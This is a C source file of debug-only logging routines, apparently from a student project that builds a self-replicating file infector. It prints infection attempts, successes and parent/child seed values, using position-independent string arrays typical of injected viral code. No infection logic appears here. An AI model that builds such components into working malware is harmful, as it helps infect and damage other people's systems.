/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   log.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/20 23:16:08 by anselme           #+#    #+#             */
/*   Updated: 2019/12/20 23:26:08 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifdef DEBUG

#include "utils.h"
#include "position_independent.h"

void	log_try_infecting(const char *file)
{
	PD_ARRAY(char, trying,'\033','[','3','6','m','[','L','O','G',']',' ','t','r','y','i','n','g',' ','t','o',' ','i','n','f','e','c','t',':',' ','\033','[','0','m',0);

	putstr(trying);
	putstr(file);
	putchar('\n');
}

void	log_success(void)
{
	PD_ARRAY(char, success,'\033','[','3','2','m','[','L','O','G',']',' ','i','n','f','e','c','t','i','o','n',' ','s','u','c','c','e','e','d','e','d','\033','[','0','m','\n',0);

	putstr(success);
}

void	log_old_father_seeds(const uint64_t father_seed[2])
{
	PD_ARRAY(char, original,'[','L','O','G',']',' ','o','r','i','g','i','n','a','l',':',' ',' ',' ',' ',0);
	PD_ARRAY(char, semicolon, ';',0);

	putstr(original);
	putu64(father_seed[0]);
	putstr(semicolon);
	putu64(father_seed[1]);
}

void	log_all_seeds(const uint64_t father_seed[2], const uint64_t son_seed[2], uint64_t client_id, uint64_t unique_seed)
{
	PD_ARRAY(char, semicolon, ';',0);
	PD_ARRAY(char, newline, '\n',0);
	PD_ARRAY(char, father,'[','L','O','G',']',' ','f','a','t','h','e','r','_','s','e','e','d',':',' ',0);
	PD_ARRAY(char, son,'[','L','O','G',']',' ','s','o','n','_','s','e','e','d',':',' ',' ',' ',' ',0);
	PD_ARRAY(char, uniquemethod,'[','L','O','G',']',' ','u','n','i','q','u','e',' ','s','e','e','d',' ','=',' ','f','i','r','s','t',' ','s','o','n',' ','s','e','e','d',' ','^',' ','c','l','i','e','n','t',' ','I','D','\n','[','L','O','G',']',' ','\033','[','3','5','m',0);
	PD_ARRAY(char, equal,'\033','[','0','m',' ','=',' ',0);
	PD_ARRAY(char, opxor,' ','^',' ',0);


	putstr(newline);
	putstr(father);
	putu64(father_seed[0]);
	putstr(semicolon);
	putu64(father_seed[1]);
	putstr(newline);
	putstr(son);
	putu64(son_seed[0]);
	putstr(semicolon);
	putu64(son_seed[1]);
	putstr(newline);
	putstr(uniquemethod);
	putu64(unique_seed);
	putstr(equal);
	putu64(son_seed[0]);
	putstr(opxor);
	putu64(client_id);
	putstr(newline);
}

#endif
